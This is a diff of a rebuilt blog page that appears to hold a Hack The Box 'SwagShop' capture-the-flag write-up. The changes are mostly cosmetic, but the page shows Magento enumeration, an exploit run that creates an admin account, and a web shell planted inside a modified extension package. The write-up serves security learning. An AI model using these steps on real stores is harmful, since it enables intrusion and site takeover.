@@ -97,13 +97,13 @@
 
 
 
-<meta name="generator" content="Hugo 0.154.2">
+<meta name="generator" content="Hugo 0.162.0">
 
 
     
     
 
-<link type="text/css" rel="stylesheet" href="/css/bundle.min.2079d7b1d4c2ab5bcf5b79f133cf9778b6f5d2c4b6169ee745a2267ed4a29706.css">
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.b29560288abdb6366b230cde3c59285c98c1152dccc466ddf7135289406f621e.css">
 
 
     
@@ -283,6 +283,8 @@
                 
                         
                 
+                        
+                
             
         
         
@@ -303,6 +305,10 @@
                         </li>
                         
                             <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2026-7537/">MDJM Event Management &lt;= 1.7.8.3 - Authenticated (Administrator&#43;) Arbitrary File Upload via mdjm_email_upload_file Parameter</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-13374/">Kalrav AI Agent &lt;= 2.3.3 - Unauthenticated Arbitrary File Upload via kalrav_upload_file AJAX Action</a>
                             </li>
                         
@@ -318,10 +324,6 @@
                                 <a href="https://ryankozak.com/posts/cve-2025-12721/">g-FFL Cockpit &lt;= 1.7.1 - Missing Authorization to Unauthenticated Information Exposure</a>
                             </li>
                         
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-12189/">Bread &amp; Butter: Gate content &#43; Capture leads &#43; Collect first-party data &#43; Nurture with Ai agents &lt;= 7.10.1321 - Cross-Site Request Forgery to Arbitrary File Upload</a>
-                            </li>
-                        
                     
                 
             
@@ -330,6 +332,8 @@
                 
             
                 
+                
+                        
                 
                         
                 
@@ -465,7 +469,7 @@
       "url": "\/images\/d0n601.png"
     }
   },
-  "image": "null",
+  "image": "\"/images/ryan‑kozak.jpg\"",
   "mainEntityOfPage": {
     "@type": "WebPage",
     "@id": "https:\/\/ryankozak.com\/posts\/hack-the-box-swag-shop-writeup\/"
@@ -511,7 +515,7 @@
 <h1 id="information-gathering">Information Gathering</h1>
 <h2 id="nmap">Nmap</h2>
 <p>We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~# nmap -sVC -o nmap_SwagShop.txt 10.10.10.140
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~# nmap -sVC -o nmap_SwagShop.txt 10.10.10.140
 </span></span><span style="display:flex;"><span>Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-11 16:30 EDT
 </span></span><span style="display:flex;"><span>Nmap scan report for 10.10.10.140
 </span></span><span style="display:flex;"><span>Host is up (0.41s latency).
@@ -534,7 +538,7 @@
 <p>When we browse to SwagShop&rsquo;s main web port, we see a Magneto shop is running. Let&rsquo;s see if we can find any interesting files using some http enumeration.</p>
 <p><img src="/posts/images/hack-the-box-swag-shop-writeup/1.png" alt="Magneto running on SwagShop"></p>
 <h3 id="http-enumeration-dirbuster">HTTP Enumeration: dirbuster</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~/Tools/dirsearch# python3 dirsearch.py -u http://10.10.10.140 -e ,php,txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~/Tools/dirsearch# python3 dirsearch.py -u http://10.10.10.140 -e ,php,txt
 </span></span><span style="display:flex;"><span> _|. _ _  _  _  _ _|_    v0.3.8
 </span></span><span style="display:flex;"><span>(_||| _) (/_(_|| (_| )
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
@@ -586,7 +590,7 @@
 <p><img src="/posts/images/hack-the-box-swag-shop-writeup/mysql_root.png" alt="SwagShop MySQL root credentials"></p>
 <p>Store these away in the event that it will help with privilege escalation later on.</p>
 <p>We find the file <code>http://10.10.10.140/RELEASE_NOTES.txt</code> which allows us to determine the Magneto version being run. That should help us determine if there&rsquo;s a public exploit available that we can leverage.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>==== 1.7.0.2 ====
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>==== 1.7.0.2 ====
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>=== Fixes ===
 </span></span><span style="display:flex;"><span>Fixed: Security vulnerability in Zend_XmlRpc - http://framework.zend.com/security/advisory/ZF2012-01
@@ -595,7 +599,7 @@
 <h1 id="exploitation">Exploitation</h1>
 <p>This exploit worked perfectly, with one slight modification. Since the site doesn&rsquo;t appear to be using <code>modrewrite</code> we must include <code>index.php</code> line 7 of the exploit, which sets the target.
 `</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~/Desktop# python shoplift.py
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~/Desktop# python shoplift.py
 </span></span><span style="display:flex;"><span>WORKED
 </span></span><span style="display:flex;"><span>Check http://10.10.10.140/index.php/admin with creds forme:forme
 </span></span></code></pre></div><p>We&rsquo;ve now created an admin user <code>forme</code>, with password <code>forme</code>.</p>
@@ -606,11 +610,11 @@
 <p>Because creating a package from scratch proved to be a little finicky for me, I chose to upload my php shell code into an existing package called <strong><a href="https://github.com/sendwithus/extension-magento/blob/master/dist/Sendwithus_Mail-1.0.2.tgz" target="_blank">sendwithus</a></strong>. To do this we simply extract the package and add our shell code.</p>
 <p><img src="/posts/images/hack-the-box-swag-shop-writeup/shells.png" alt="Shell code in modified Magneto package."></p>
 <p>Generate our checksum for the shells.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>x@wartop:~/Desktop/HTB_Swagshop$ md5sum shell.php &amp;&amp; md5sum rshell.php
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>x@wartop:~/Desktop/HTB_Swagshop$ md5sum shell.php &amp;&amp; md5sum rshell.php
 </span></span><span style="display:flex;"><span>f2013115840359271c1f3e4661091efa  shell.php
 </span></span><span style="display:flex;"><span>55c320877fe1ecda130c33ecdf3e95a1  rshell.php
 </span></span></code></pre></div><p>Then we modify the <code>package.xml</code> to also include our shells.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;file</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;Mail.php&#34;</span> <span style="color:#a6e22e">hash=</span><span style="color:#e6db74">&#34;999a50a911486c5c48a5c43d5a072220&#34;</span><span style="color:#f92672">/&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;file</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;Mail.php&#34;</span> <span style="color:#a6e22e">hash=</span><span style="color:#e6db74">&#34;999a50a911486c5c48a5c43d5a072220&#34;</span><span style="color:#f92672">/&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;file</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;shell.php&#34;</span> <span style="color:#a6e22e">hash=</span><span style="color:#e6db74">&#34;f2013115840359271c1f3e4661091efa&#34;</span><span style="color:#f92672">/&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;file</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;rshell.php&#34;</span> <span style="color:#a6e22e">hash=</span><span style="color:#e6db74">&#34;5f8af08f753e5d318d307e75ad91c039&#34;</span><span style="color:#f92672">/&gt;</span>
 </span></span></code></pre></div><p><img src="/posts/images/hack-the-box-swag-shop-writeup/package.png" alt="Uploading Magneto package with our shell code."></p>
